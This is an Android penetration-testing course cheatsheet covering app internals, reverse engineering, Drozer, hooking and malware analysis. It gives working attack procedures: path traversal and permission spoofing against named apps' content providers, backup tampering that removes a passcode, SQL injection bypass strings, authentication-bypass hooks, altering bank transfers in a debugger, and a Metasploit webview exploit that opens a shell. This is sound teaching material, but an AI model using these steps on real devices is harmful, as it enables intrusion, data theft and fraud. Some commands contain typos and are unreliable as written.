# Android Security Cheatsheet :

-----------------------
## 01_Android

- Android internals
- Permission Model
- Setting up an Android Pentesting Lab
- Reverse Engineering apps
- Smali labs
- Dex internals

Introduction to Android

- Most popular smartphone platform in the market
- Hugely popular among both developers and consumers
- Open source
- Built on top of linux
- Can be customized and modified to build own ROMs.

AOSP

- AOSP led by google
- Source code could be downloaded and modified
- Custom ROMs
- Security Issues in Custom ROMs
- http://forum.xda-developers.com/android

-----------------------
## 02_Android_architecture

Android architecure is divided into four categories

- Applications
- Application framework
- Libraries | Android Runtime
- Linux Kernel

Security Architecture

- Two tier security model : Linux based and Android based
- Runs in parallel
- Privilege Separation Model (derived from linux)
- Each app with its own UID and GID
- Linux permission provides secured access to android resources and files
- Permission Model (From android)

Setting up the Pentest VM

- Using Santoku for the entire training course
- Download from santoku website and install in virtual box

-----------------------
## 03_Android_Permissions

Android Permissions

- Defined in AndroidManifest.xml file
- Have to be specified by the developer
- Can't be added later on
- All or None Flaw : for eg : Android < 4.0 doesn't need
  READ_EXTERNAL_STORAGE to read SDCard

AndroidManifest.xml

- Specified properties of the application
- Package Name
- Activities, Services, Broadcast Receivers etc
- Permissions definitions and usage
- Info on external libraries
- SharedUID

Procedure :
After downloading an apk, unload the files inside android using unzip
```
cp android.apk android.zip
unzip android.zip
```

Now,
```
cd android/
cat androidmanifest.xml
```
Note : We can't read the contents into the file. We need apktool to decompile.

```
cd ..
apktool d android.apk

cd android/
cat androidmanifest.xml
```
Note : Now we can read the contents of the file.

Going deeper

- Each app is assigned to a unique UID
- In some cases, two apps could even have a same UID
- Apps could belong to multiple GIDs depending on the permissions needed by the app
- Stored at /data/system/packges.xml
- Permission to group mappins located at /etc/permissions/platform.xml

-----------------------
## 04_Android_Security_and_Exploitation

Android Applications

- File format APK
- Archive file contains the java codes, raw files and the other resources
- Runs within a virtual machine
- DalvikVirtualMachine executes the dex file

Singing in Android

- No certificate authority, unlike iOS
- Developers could generate their own certificates
- App signed with the public key, whereas the private key stays with the developer.

Signing Apps in Android

- keytool 
- jarsigner

Procedure :
Create an unsigned file first.
```
apktool d -f firefox.apk
```

Now build the application:
```
apktool b firefox/ -o firefox.apk
```

To verify the application is signed and sign it:
```
jarsigner -verify -verbose newfirefox.apk
```
Note : not signed
```
cp ../../Downloads/training/CTF/cocon/my-release-key.keystore .

jarsigner -verbose -sigalg MD5withRSA -digestalg SHA1 -keystore my-release-key.keystore newfirefox.apk alias_name

Enter passphrase : android
```
Now verify jar sign,
```
jarsigner -verify -verbose newfirefox.apk
```
Note : Now it is verified with sign.

Verifying apps signature :

- Manifest.MF - declares the resources
- CERT.RSA - Public key certificate
- CERT.SF - All the resources accounted for the app's signature
- Printing the signatures :
	- keytool -printcert -file META-INF/CERT.RSA

- Signature of files included:
	- cat META-INF/CERT.SF

Procedure :
```
cd newfirefox/META-INF
keytool -printcert -file CERT.RSA

ls (it display ALIAS_NA.RSA)

keytool -printcert -file ALIAS_NA.RSA
```

-----------------------
## 05_Setting_up_Genymotion

Download and install genymotion

Now from santoku,
```
adb devices
```
Right now, no devices is connected.
Genymotion ip is 192.168.56.101
```
adb connect 192.168.56.101

adb devices
```
Note : now android device connected will be displayed.

-----------------------
## 06_Android_app_components

- Activities
- Services
- Broadcast Receivers
- Shared Preferences
- Intents
- Content Providers

Activities

- Visual Screens of an Android application
- Contains of different layouts
- Anything you could interact with
- Wallet applications

Procedure :
Now go to AIM messenger,
the login screen you see is an activity.
The user registraion page you see is an activity.

Services

- Backgroudn events in an Android application
- Eg: Downloading files/ playing music

Note before intent : Inorder for activities to interact with other parts of android, it needs intent.

Intents :

- To bind different android components
- Used to perform different kinds of actions
- Changing activities, invoking activities in another application, starting an action etc.
- Intent filters.

Note before Activity Manager : Inorder for us to interact with activities, we need activity manager.

Activity Manager :

- Could be used to launch applications and pass data while launching
- Could also be used to launch specified activities within the application.
```
am start [package name]
am start -n com.package.name/com.package.name.ActivityName
```

Working with intent filters :
```
am start -a android.intent.action.VIEW http://google.com
am start -a android.intent.action.MAIN --es "sms_body" "Hello there" --es "address" "123456789898" com.android.mms/.ui.ComposeMessageActivity
```

Procedure :
```
adb shell
am start -a android.intent.action.VIEW http://attify.com
```

Note : It opens browser and opens attify.com

Now to send an sms :
```
am start -a android.intent.action.MAIN --es "sms_body" "Hello there" --es "address" "123456789898" com.android.mms/.ui.ComposeMessageActivity
```

Note : it will send an sms

Content providers :

- Storing and sharing application data
- Acts as a middle layer
- SQLite,XML,PlainText
- Often Vulnerable

Shared Preferences :

- Way of storing in Android Applications
- Generally small values with name value pairs
- Located in the shared_prefs folder inside the app directory.

Broadcast Receivers

- Receivers broadcast from various events
- Could be from the phone or another app
- Used by a lot of malwares

-----------------------
## 07_Dex_analysis

What is a dex

- Dalvik Executable
- Runs in the Dalvik Virtual Machine
- Structure - /aosp/dalvik/libdex/DexFile.h
- Dx and dexdump tool

Dex file header

- Magic Number for dex files: 64 65 78 0a 30 33 35 00 or dex\n035
- Hexdump -C classes.dex | less
- Dx and Dexdump

Procedure :
```
hexdump -c classes.dex | less

dexdump -l xml classes.dex | less
```
Now, download and install EditorLinuxInstaller

Download DEXTemplate.bt

https://raw/githubusercontent.com/jlarimer/android-stuff/master/DEXTemplate.bt
```
dexdump -l xml classes.dex
```
Open an app in the 0IO editor(Facebook.app here) and run the template in tools ->run template

010 Editor

- Great tool to analyze dex files
- Available for linux, OSX and Windows
- Download and install from sweetspace.com/0I0editor
- Download dex template from github.com/strazzere/0I0Editor-stuff/

DalvikVM

- Dalvik Virtual Machine
- Run dex files
- javac HelloWorld.java
- dx --dex --output=classes.dex Test.java
- Dalvikvm -cp classes.dx classname

-----------------------
## 08_Android-Debug-bridge

Introduction to ADB

- Android Debug Bridge
- Used to interact with the device/emulator
- Adb daemon
- Could be used to debug apps, install applications, do file system modifications etc.

Procedure :
```
adb start server

adb kill server

adb shell

adb -s 192.168.56.101:5555 shell

echo "TEST" > test.txt
adb push test.txt /mnt/sdcard/test.txt

adb install catch.apk

adb uninstall com.threebanana.notes

adb backup com.threebanana.notes -f catch.ab

adb logcat

adb shell ps | grep -i base

adb push srcaddr destaddr

adb pull srcaddr destaddr
```
-----------------------
## 09_Logging-based-vulnerabilities

Android logcat 

- Used to view and analyze logging data of device and applications
- adb logcat
- Security risks

Procedure :
```
adb shell ps | grep -i yahoo

adb logcat | grep 1424
```

Try logging in yahoo messenger, we will get some info.

Now we will try decompiling application, we can look for specific strings.
```
apktool d yim.apk -o yahoo

cd Yahoo
grep -iRn 'Log.d' .
```

Try some other decompiler so more info will be there:

jadx is another decompiler. Download the skylot/jadx from github
```
./jadx yim.apk -d Yahoo
grep -iRn 'Log.d' .
```

Note: We will be seeing more details on open bugs here.

-----------------------
## 10_Reversing_Android_apps

Load the cocon CTF app from COCON CTF by anand srivastava:

adb install cocon_apk.apk

Note : Here our objective is to find why the key is disabled and we have to gain access.
```
apktool d cocon_apk.apk -o Cocon_dec/

cd Cocon_dec/
ls
cd smali/
ls -la
```

Note: If you read androidmanifest.xml, there will be packagename coc.on meaning there will be a folder coc and inside on

```
cd coc/
cd on/
ls -la
```

Note : Forget the R$ smali files Choose cocon.smali

```
vi cocon.smali
```

Note : v0 are registers and p0 are parameterized registers
Note : v7, p0 are showing key. 

Note : This is a bit confusing. Use jadx to check same code
```
./jadx cocon_apk.apk -d Cocon

cd Cocon/coc/on/
ls -la
vi cocon.java
```

Note : A different code is happening here. We need to edit the this.key_value to 1 so we can get the key.

```
Now go back to Cocon_dec/smali/coc/on/
vi cocon.smali
```

change const/4 v0, 0x0 to 0x1

Now save and build the application.
```
apktool b Cocon_dec/ -o New_Cocon.apk

adb uninstall coc.on
```

Sign the application before installing:
```
jarsigner -verbose -sigalg SHA1withRSA -digestalg SHA1 -keystore my-release-key.keystore New_Cocon.apk alias_name
Enter passphrase : android
jarsigner --verify --berbose New_Cocon.apk

adb install New_Cocon.apk 
```
Note : Now if you open Genymotion and click the app, we will get the key.

-----------------------
## 11_Reversing_Android_apps

Analysing malware samples

- Normal way as we will analyse an app
- Wil lsee two malware samples:
	- Tracer.apk
	- Secrettalk.apk

Note : To download more malwares of android, visit contagio minidump

TRACER :
--------
Procedure :
```
cd Android-malwares/TRacer/
```
First thing we have to find who signed the app

```
cd META-INF/
keytool -printcert -file CERT.RSA
```
Note : We find owner is Killer Mobile Software

Now decompile,
```
d2j-dex2jar Tracer.apk

jd-gui Tracer.jar
apktool d Tracer.apk
```
Now if you look at androidmanifest.xml, we can see the package name is com.android.system.proc

Note : Normal user will see this and believe this is system package.

Now look at that particular package in jd-gui,
```
com -> android -> system_proc
```
Now look at another package, com.killermobile.app
```
com -> killermobile -> app
```
We can see the contents of what the malware can do.

SECRETTALK:
--------
```
./jadx com.android.secrettalk-1.apk -d SecretTalk

cd SecretTalk
ls -la

cd com/android/secrettalk
ls -la
vi smsreceiver.java
```
Note : Here if we look, it listens for android.provider.Telephony.SMS_RECEIVED and sends it to a secret server

If we look down, there is an email credentials to which the malware should be transmitting the virus.

-----------------------
## 12_Traffic Analysis

Traffic Interception

- Active : Burp, MITMProxy, Charles, Mallory
- Passive : TcpDump

Procedure :
Start Burp

ifconfig for santoku
Wifi -> Modify Network -> Proxy settings - > Proxy hostname -> 192.168.161.206 -> Port 8080
Save

In burp also, go to proxy -> options
Click all interfaces and port 8080 and save

Now intercept is on and signin the any.do app

Sign in the app and now if you look at the burp intercept, 
we can look at the credentials.

For burp ca: http://burp, download the CA certificate, install.
Settings -> security -> Install from sdcard/

If the certificate is disabled, go to adb connect
```
cd /mnt/sdcard/Download
ls -la
mv caecert.der caecert.crt
```
Now we can install the certificate.

-----------------------
## 13_SSL_Pinning

Bypassing SSL Pinning : 
- App : SSLPinningExample.apk
- Decompile the APK
- Find the methods responsible for validating the trustness of the cert
- Patch the method by simply removing the code lines
- Refer to : Bypassing SSL Pinning paper by Denis Andzakovic

Setting breakpoints at HttpsURLConnection
- Setting breakpoints at HttpsURLConnection.setSocketFactory()
- Modifying the local variables
- AndroidSSLTrustKiller by iSecPartners
- Will see more of it in iOS

-----------------------
## 14_Leaking_Content_Providers

App communicating with a database(sqlite)

App => Database (SQLite)

But Content providers act as a medium to retrieve and share data from database

App => CP => XML Text from Database (SQLite)

So CP might be vulnerable here.

Procedure :
Here we will use an application called catch in geny motion.

Enter note inside as "My secret note" 

Go inside the package folder.
```
cd /data/data/com.threebanana.notes/databases

sqlite3 notes

select * from notes;
```
Note : We can look at the notes.

To find where the apk is stored:
```
adb shell pm path com.threebanana.notes
```
Displays : /data/app/comthreebanana.notes-1.apk

Now,
```
mkdir catch
cd catch

adb pull /data/app/comthreebanana.notes-1.apk

apktool d com.threebanana.notes-1.apk
ls -la
```
Now, content providers always starts with content://

So instead of select * from [] where id='' 
developers can use content://sms to make life easier

So,
```
grep -iRn 'çontent://'
```
Extracting information from content providers

- Catch Application downloaded from http://attify.com/catch.apk
- Reverse the application using Apktool
- Find out the content providers (Content Providers start with content://)
- Find out the Notes content provider (Content Provider storing notes)
- Query the content provider using adb shell content query --uri [content provider uri]

```
adb shell content query --uri content://com.threebanana.notes.provider.NotePad/notes
```
Here you can see the text fields.

-----------------------
## 15_Drozer-Kung-Fu

Introduction to Drozer

- Framework written for Android Application Assessment and Exploitation by MWR InfoSecurity
- Written on iPython
- Has modules such as Leaking Content Providers, LFI, Scanning, Reverse Shell etc
- Extensible via own modules

Download and install drozer apk in genymotion.

First porward the ports,
```
adb forward tcp:31415 tcp:31415

drozer console connect

ls
run app.package.attacksurface
```
To find package name:
```
run app.package.list

run app.package.attacksurface com.threebanana.notes
run app.provider.finduri com.threebanana.notes
```
Here we are interested in .NotePad/notes
```
run app.provider.query content://com.threebanana.notes.provider.NotePad/notes --vertical
```

-----------------------
## 16_Read_based_content_provider_vulnerability

Adobe Reader Vulnerability

- Vulnerable to Leaking Content Provider
- Path Traversal Vulnerability
- Could exploit Adobe Reader's permission to read any files from SDCard
- Discovered by Sebastin Guerro

Procedure:
```
dz> run app.package.list -f adobe

run app.package.attacksurfacecom.adobe.reader

run app.provider.finduri com.adobe.reader
```

Now if we proceed in the normal way like,
```
run app.provider.query content://com.adobe.reader.fileprovider/
```

We won't get the desired result.
This is because the CP is not attached to database.

```
adb shell
cd /mnt/sdcard
ls
secret.txt
```
A secret text is provided in sdcard

Checking permissions of the package

```
run app.package.info -a com.mwr.dz
```
So drozer has only INTERNET permissions

```
run app.package.info -a com.adobe.reader
```
Adobe has permissions to read from sdcard

```
run app.provider.readcontent://com.adobe.reader.fileprovider/mnt/sdcard/secret.txt
```
We won't get the expected result.

All we have to put is full directory traversal to exploit this,
```
run app.provider.readcontent://com.adobe.reader.fileprovider/../../../../mnt/sdcard/secret.txt
```

Note : It will display the text

-----------------------
## 17_Advanced Drozer_Kung_Fu

CSIP Simple Vulnerability

- Not directly exploitable
- Uses custom permission to prevent content provider from being vulnerable
- Lack of protections in the permission
- Could have Drozer ask for same permissions and exploit the vulnerable content providers
- Discovered by Joshua Drake

So the package name is csipsimple

```
run app.package.list -f csip ( We can also use adb shell ps | grep -i csip)
com.csipsimple

run app.provider.finduri com.csipsimple

run app.provider.query content://com.csipsimple.db/outgoing_filters/
```

So the provider says permission denied

So decompile the csip application,
```
apktool d CSipSimple.apk

vi AndroidManifest.xml
```

So here there is something which uses android.permission.CONFIGURE_SIP
And if you look down, there is also a permission declaration android.permission.USE_SIP/android.permission.CONFIGURE_SIP

Simple copy these permissions,
```
leafpad AndroidManifest.xml &
```

Also open drozer agent.apk and decompile,
and open the androidmanifest.xml

Copy the contents of csip manifest to drozer manifest.
Also copy the uses-permission

Also there's a string tag which is connected to strings.xml

```
leafpad csipsimple/res/values/strings.xml &
leafpad agent/res/values/strings.xml &
```

Copy the strings from csipsimple to agent.

Now recompile the agent 
```
apktool b agent/ -o newagent.apk
```

Sign the new apk,
```
cp newagent.apk ~/Downloads/training/CTF/cocon/
ls
nano signing.txt
```

change the package name to newagent.apk

```
jarsigner -verbose -sigalg SHA1withRSA -digestalg -SHA1 -keystore my-release-key.keystore newagent.apk alias_name
Enter passphrase : android

adb uninstall com.mwr.dz

adb install newagent.apk

./start-drozer.sh

run app.provider.query content://com.csipsimple.db/outgoing_filters/ --vertical
```

Now it works.

-----------------------
## 18_Drozer_Scripting

- Could be used to automate tasks
- Build your own private repo of vulns/exploits
- Will take an example of Information Extractor by Keith Makan

Structure of a drozer module

Name the file : ex.device.info
```
from drozer.modules import Module
class Info(Module):
	name="---"
	description="---"
	examples="--"
	author="---"
	license="--"
	path=["ex","device"]

	def execute(self, arguments):
		[code]
		
```

Simple Information extractor :

- Have a look at developer.android.com/reference/android/os/Build.html
```
def execute(self,arguments):
	build = self.new("android.os.Build")
	self.stdout.write("Getting device info...\n")
	self.stdout.write("[*] BOARD : %s\n" % (build.BOARD))
```

Creating a drozer repo
```
- Save the file as ex.device.info
- dz>module repository create absolute-new-folder-name
- dz>module install /absolute/ex.device.info
- run ex.device.info
```
Procedure :
```
nano -c Download/training/vulnapps/ex.device.info
```
So this is how the script looks like
```
./strat-drozer.sh
```
First we need to create a repository,
```
dz> module repository create /home/adi/Desktop/drozerrepo

module install /home/adi/Downloads/training/vulns/ex.device.info

Check for proper indentations because it's python.
locate ex.device.info

run ex.device.info
```

-----------------------
## 19_Dropbox_Vulnerability

- Vulnerable in the content provider
- Not exported, but a big mistake by the developer
- Use dropbox.apk and try to find out the vulnerability
- Discovered by the Intrepidus Group
```
apktool d -f dropbox.apk

vi dropbox/Androidmanifest.xml
```
Now if you look at the androidmanifest, there will be application label, content provider etc
Also grant-uri-permission with have pathPrefix= "/"

So what they mean is that they have provided permission to the entire filesystem of android.

So anything that this application interacts with provides to all android filesystem
```
adb shell
cd /data/data/com.dropbox.android
ls -la
sqlite 3 prefs.db

.tables

.headers on
.mode line

select * from android_metadata;
```
Note : there's nothing. Let's look at another table

```
select * from DropboxAccountPrefs;
```
Note : Here all the entire access key is there.

```
cd DropboxVuln/
cd src/
ls

cd com/
cd aditya/dropboxvuln/
ls

nano ManiActivity.java
```
Now if you look at the code, prefs.db will take the files and upload it to public/

Now if you look at genymotion, dropbox/public it will be empty

Now go to original dropbox, the secret file is shown.
Now if you go back to dropbox/public, the secret file is uploaded.

-----------------------
## 20_Backup_based_vulnerability

Android Backup Vuln

- Android allows backups and restoration of its data [without root]
- Attacker could take the backup of an app,modify the contents and restore it back again
- Lastpass Vulnerability (Patch now, found by Chris John Riley)
- Box Vulnerability (Discovered by Aditya: http://blog.attify.com)
- Can use Android Backup Extractor (http://sourceforge.net/projects/adbextractor/)

So open box ,settings , enter passcode, come back application. It will ask for a passcode.
So you can also take backup of an application using custom methods

Exploiting Backup vuln:
```
adb back com.box.android -f app.db
dd -if=app.ab bs=24 skip-I | openssl zlib -d>app.tar
tar -tf app.tar>app.list
tar -xvf app.tar
//Editing//
star -c -v -f box_new.tar -no-dirslash list=box.list
dd if=app.ab bs=24 count=I of=app_new.ab
openssl zlib -in app_new.tar >> app_new.ab
adb restore app_new.ab
```
So this is a bit complicated and a tool can perform this called ABE
from Sourceforge

Procedure:
```
adb shell ps | grep -i box

adb backup com.box.android -f box.ab
```

Now if you look at genymotion, it will asks for backup.

We will go without a passcode.

Now we will have a file called box.ab
```
hexdump -C box.ab | less
```
The first 24 files will have ANDROID_BACKUP

Once you download the android backup extractor and extract it,
```
java -jar abe.jar unpack box.ab box.tar

tar -tf box.tar > box.list

tar xvf box.tar

d apps/com.box.android/sp

grep -iRn 'pin' .
```
So there is a mention of pin in the myPreference.xml

```
vi myPreference.xml
```
So there is a pincode with encrypted value.

So simple remove this line and save it.
```
cd ../..
star -c -v -f box_new.tar -no-dirslash list=box.list

java -jar abe.jar pack box_new.tar box_new.ab

hexdump -C box_new.ab
```

Backup is good.

```
adb restore box_new.ab
```

Now open restore in genymotion.

The box has been opened without any passccode.
And if you look at settings, there will be no passcode set.
```
Prevention : android:allowBackup= "false"
```
-----------------------
## 21_Client_Side_Injection


SQLite injection

- SQLite databases for storing application's data
- Storing sensitive information in databases
- Do you sanitize user input before applying SQL queries

```
cd Downloads/training/Clientsideinjections/
ls

adb install sqliteapp.apk
```
So if you go inside genymotion,
open app and enter your user credentials,
and then fill in the details in the next page.

So if my correct login is given, it will give my details.
It should be bypassed here.
```
dex2jar sqliteapp.apk

jd-gui sqliteapp_dex2jar.jar

So in com.attify.sqliteapp -> DatabaseConnector
```
Look at getRecord and addRecord

So here getRecord selects the item from vulnerable db and shows it to the user
```
adb shell
ls -la
cd databases/
sqlite3 vulnerable-db

.tables
select * from USER-RECORDS;
exit
```
Now we know how this processes

Use this in sql login 1'or'1='1-
```
User : Aditya1'or'1='1-
Password : 12345
```
-----------------------
## 22_Hooking_Introduction_and_setting_up_InsecureBankSetup

Android Hooking

What if >
- Want to analyze methods on the go and check what arguments are being passed
- Relies on custom protocols for communication
- Uses crypto (might be leaking key!)
- How do you analyse the application?

So you can create an apiHook and call the api and then analyze the application

Tools we'll use
- JDB : The java Debugger
- AndBug
- Introspy
- Cydia Substrate
- Xposed framework

Setting up InsecureBank

- Vulnerable app written by Dinesh Shetty
- Client - Server architecture
- python app.py
- Login to the application using dinesh:dinesh@123$

```
cd Insecure-Bank/bin/

adb install InsecureBank.apk

Login to your application

cd AndroLabServer

python app.py
```
It will start the webserver.

Login to the server using dinesh:dinesh@123$

Now we can note all the transactions happening at 
```
adb logcat

adb shell ps | grep -i insecure
adb logcat | grep 1212
```

-----------------------
## 23_Android-Debugging-with-Andbug

Andbug

- Wrapper around JDWP
- Much more interactive shell compared to JDB
- Once we identify the class/method, we can go to JDB to analyze and set breakpoints.
- https://github.com/swdunlop/AndBug
- Try it on Insecure bank.

Andbug

- Fine the method responsible for the transaction
- Trace the method and analyze the arguments passed when a transaction happens
- classes com.android.insecurebank
- methods [name of the class]

Procedure :

In last procedure, in insecurebank, we are able to transfer account from one to another.
```
unzip Andbug-master.zip -d Andbug
cd Andbug/
python setup.py install

adb shell ps | grep -i insecure

andbug shell -p 1212

classes com.android.insecurebank
```
Note : So now we are looking inside the methods of the loaded classes. Rest client

```
methods com.android.insecurebank.RestClient
```
Note : There is a dotransfer class inside the methods.

```
method-trace com.android.insecurebank.RestClient.dotransfer
```

Note : Now whenever the dotransfer is executed, it will hook with the below displayed hooks.

Now if you try to do a transfer in genymotion, it will display the details in the andbug.

-----------------------
## 24_Debugging-with-JDB

JDB

- Could debug apps using the JDB (Java Debugger)
- Find out which apps are debuggable
	- dz > rub app.package.debuggable
- If an app is not debuggable, reverse and add
	android:debuggable=true to AndroidManifest.xml

- Relies on JDWP
- Official docs:https://docs.oracle.com/javase/7/docs/technotes/tools/windows/jdb.html

JDWP

- Java Debugging Wire Protocol
- Introduced in JDK 1.4.2
- Used to debug java apps running in JVM
- Also supported by DVM
- Could also use JSwat (https://github.com/nlfiedler/jswat) which runs on JDWP

Debugging app using JDB
- dz> run app.activity.start -component [package name] [activity name]
- adb shell ps | grep 'packagename' or adb jdwp
- adb forward tcp:[localport] jdwp:[port on device]
- jdb -attach localhost:[localport]

Debugging app using JDB 2

- classes
- methods com.android.insecurebank.RestClient
- stop in com.android.insecurebank.RestClient.dotransfer
- go to the app and initiate the transfer
- where
- locals
- set amount="2000"
- dump this
- eval dotransfer("192.168.161.180","8080","12345","56788","1337")

Procedure:
```
adb shell ps | grep -i insecure

adb forward tcp:1337 jdwp:1212 (Use the process id)

jdb -attach localhost:1337
```

Note : if jdb is initialized then it works. We will see all classes. But can't parse like Andbug
Since we know the methods already, we will go directly.

```
methods com.android.insecurebank.RestClient
```
Note : Here additional methods are visible which are not visible by Andbug.
Setting a breakpoint after dotransfer,

```
stop in com.android.insecurebank.RestClient.dotransfer
```
Note : Now try to transfer some amount in genymotion, Breakpoint will hit.
Now here we can change the variables of the payment and other fields.

```
main[1] set amount="70000"

resume
```

To verify it the transaction is changed,
```
adb logcat | grep -i 1212
```
Note : Now we can call a particular method using JDB also

Now try transfering in Genymotion and exectute eval do transfer to make commands simpler.

```
eval dotransfer("192.168.161.241","8080","12345","56788","1337")
```
The mentioned amount in the port will be transfered.

-----------------------
## 25_Automated-Hooking-With-Introspy

Hooking using Introspy

- Comes with Introspy-core and config
- Works on top of MobileSubstrate for Android-Written by Jay Freeman (Saurik)
- Could easily set up hooks on interesting functions.

Setting up Introspy

- Install supersu
- Install CydiaSubstrate for Android
- Link using CydiaSubstrate
- Soft reboot
- Install Introspy-Core and Introspy-Config
- Select the APIs to hook in Introspy-Config app on the device.

Procedure :
Install SuperSU in android genymotion.
Choose normal mode -> allow.

Next install Saurik substrate.

Link Substrate files -> Grant SU permissions -> Restart System(soft)

Now cydia substrate is added to SuperSU.

Now install Introspy
```
adb install "Introspy-Android Core.apk"
```
Now open introspy config and choosing introspy and granting supersu permissions.

Now also granting supersu permissions to insecurebank,
Now introspy will automatically create a report for us for insecurebank.

So logging inside insecurebank and transfering money to the account.
```
adb logcat, it will show a file where it is stored.

adb shell touch /mnt/sdcard/statements/rawhistory.html

adbshell
cd /mnt/sdcard
mkdir statements
cd statements/
touch rawhistory.html
```
Now try transfering again. No error will be there.

Notice there will be cydia substrate hooks will be present in the logs.

Now go insdie the application and analyze it.
```
cd /data/data/com.android.insecurebank

ls -la
```
Note : Introspy would not have created the database. So in this case, we have to restart the genymotion.

```
adb connect 192.168.57.102
```
Now do the same process again and transfer money.

```
adb shell ls /data/data/com.android.insecurebank.databases

cd Introspy-Analyzer-master

adb pull /data/data/com.android.insecurebank/databases/introspy.db Insecure.db
```
Now create a html report

```
python introspy.py -p android -o InsecureBank Insecure.db

ls -la

cd InsecureBank

firefox report.html
```
Note : the html page will show all the arguments, return value etc.

-----------------------
## 26_Cydia_Substrate

How do you make changes permanent

- Debugging and Hooking are good, but not permanent solutions
- Patching application by reverseing might be too much complicated and time and effort consuming
- Can use Cydia substrate or Xposed framework to make changes whenever an API is called

Hooking using Cydia Substrate

- Platform for customizing software
- Cydia provides an API using which we can hook into method and API calls
- Modify the behaviour of other apps installed on the device
- Really convenient for permanent patching for apps
- Will use the example by GDS Security - Listlock (http://github.com/GDSSecurity/SubstrateDemo)

Procedure :

Download the apk from github repo using wget
```
adb install com.gdssecurity.listlock.apk

d2j-dex2jar com.gdssecurity.listlock.apk

jdgui com.gdssecurity.listlock-dex2jar.jar
```
Now if you look at com.historypeats.listlock -> Authenticate
Now look at a method for validatepassword
It takes two arguments, string paramstring and validating it with getSavedPassword
We have to bypass this with cydia substrate

Cydia Substrate API

- MS.hookClassLoad notified whenever a particular class gets active
- Once we know that a class has been loaded, we can then use MS.hookMethod
- More info at http://www.cydiasubstrate.com/api/java/MS.hookClassLoad
```
MS.hookClassLoad("AuthenticationMethod", new MS.ClassLoadHook()
{
public void classLoaded(Class<?> _class)
{
/* do something with _class argument */
/* Change variable values, change return type etc. */
}});
```

ListLock Bypass

- Reverse the application
- Identify the method responsible for validating the password
- How we can make the authentication successful

If you look at the code, its a boolean function. So if we change the return value to always true,
no matter what is the answer, we will be able to authenticate.

So open in eclipse,
```
vi src/com/gdssecurity/listbypass/ListBypass.java
```
Class name is com.historypeats.listlock.classes.Authenticate

It uses MS.hookMethod to change some of its components

So go to eclipse and run the listBypass,
connect genymotion and if you notice, the top bar shows cydia substrates updted.
Restart soft and then ok.

Now if you enter any application. You will have the application unlocked.

-----------------------
## 27_Hooking-using-Xposed

XPosed Framework

- Framework for modifying system and apps behavior written by XDA member rovo89
- Copies itself to /system/bin and adds additional Jar later
- Gets started during the system boot
- Different ways to achieve the same goal
- A few minor differences between the Xposed and Cydia framework

```
adb install de.robv.android.xposed.installer_v33_36570c.apk
```

Click on framework, click install.
Once done, go to modules.

XPosed API
- 	Xposed API			What it does
	handleLoadPackage		notifies when a package has been loaded
	findAndHookMethod		Helper Class
	beforeHookedMethod		Manipulate the parameters and prevent the call to original method
	afterHookedMethod		Action taken/changed to be based on the result of original method

XPosed API

beforeHookedMethod -> Original Method -> afterHookedMethod

Listlock Bypass using Xposed

Package Name -> Hooking class and method
				|
				V	
Change the password to match <- beforeHookedMethod 
the argument 
	|
	V
afterHookedMethod -> Authentication Granted

Procedure:
Look at BypassValidation class -> lib, it will be using XposedBrigedApi-54.jar

And inside src -> Bypass.java

We will haev the package name com.historypeats.listlock

It will be using the before hook method,
```
param.args[1] = param.args[0]
```

which means return the same.

Right click Bypass Application, run as android application,

go to xposed api, we will have the module.
Now restart the device.

adb logcat to track what's happening

Now bypass validation is activated.

Now if you look at logcat, the wrong password will bind with the actual password.

-----------------------
## 28_Androguard-Scripting-and-Analysis

Androguard 101

- Reverse Engineering and Malware Analysis framework
- Open Source
- Really handy for analyzing applications
- https://github.com/androguard/androguard

Androguard has many different tools - androlyze(analysis), androsim(similarities), andromercury(drozer)			

Getting Started

- Loadup Androguard -Androlyze
- Get all the activities, permission and servies
- How to find classes and methods?
- What about source code ?

- androlyze -s
- myapp = APK('/absolute/path/of/apk')
- myapp.get_activities()
- myapp.get_permissions()

Procedure : 
```
androlyze -s 

myapp=APK('/home/adi/Downloads/training/vulnapps/catch.apk')
```

Now if you type myapp and hit tab, it will show you a bunch of option.

myapp.get_activities()

myapp.get_services()

myapp.get_providers()

myapp.get_permissions()

myapp.get_details()

myapp.get_files()

Retrieving all classes :

```
- d = dvm.DalvikVMFormat(myapp.get_dex())
```

Print out all the class names :
```
- for class in d.get_classes():
	print class.get_name()
```

Procedure :

```
d = dvm.DalvikVMFormat(myapp.get dex())

d

for t in d.get_classes():
	print t.get_name()
```
Note : We will be displayed with all classes.

-----------------------
## 29_Whats_a_webview

- What's a webview?
- Can you execute Javascript using Webview?
- Can the Javascript interact with the Javacode via the interface?
- What can you do with the interaction?

Webviews in Android

- Allows developers to display web content within apps
- Could be app content or for advertisements
- Sept 2013: ~70% of the apps use webview
- Gives websites access to system related info and data

- Great Resource for webview exploitation: http://50.56.33.56/blog/?p=314

Who were vulnerable ?

- 8/10 ad libraries
- All of the popular ones
- Almost 95% of the entire Android users

Webviews in Android

- Using webview
	- WebviewAppsWebview = new Webview();
	  AppsWebview.addJavascriptInterface(new ClassName(), "android");

- Interface name : android
- Sample vulnerable code from https://github.com/jduck/VulnWebView

Procedure :

So here in the mainactivity.java, the class name is vulnerable.attiy.webviewapp

And defines the webview element in middle. Sets javascript element to true.
So the url which it tries to load is a local ip.

Change this ip to the local ip of santoku with port 8000.
```
python -m SimpleHTTPServer
```

Open genymotion, set proxy(already set)

Now if you intercept the request in burp, it displays the index.html

Now try adding script to the html page.

It will show you the webview vulnerability.

-----------------------
## 30_Exploiting-webviews-with-metasploit

Exploitation with Metasploit

- msfconsole
- use exploit/android/browser/webview_addjavascriptinterface
- set LHOST [local-ip]
- set URIPATH vuln
- exploit

Procedure :
```
msfconsole
use exploit/android/browser/webview_addjavascriptinterface
show options
set LHOST 192.168.161.134
set URIPATH vulnerable
exploit

sessions
ps
shell
su
```
